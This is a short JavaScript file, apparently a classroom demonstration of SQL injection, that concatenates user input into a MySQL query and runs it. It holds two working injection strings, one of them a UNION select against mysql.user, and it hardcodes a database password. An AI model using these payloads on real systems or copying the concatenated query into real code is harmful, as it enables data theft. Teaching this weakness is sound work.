import mysql from 'mysql2/promise'

// create the connection to database
const connection = await mysql.createConnection({
  host: 'localhost',
  database: 'ismv4',
  user: 'app1',
  password: 'welcome123'
})

// naive query
let queryString = 'select last_name from students where email='

let regularUserInput = 'jane@etc.com'

let hostileUserInput1 = "' or 1=1;#"
let hostileUserInput2 = "' or 1=1 union select user from mysql.user;#"

let [rows, _] = await connection.query(queryString + "'" + hostileUserInput2 + "'")

console.warn(rows)

await connection.destroy( )

// query execution
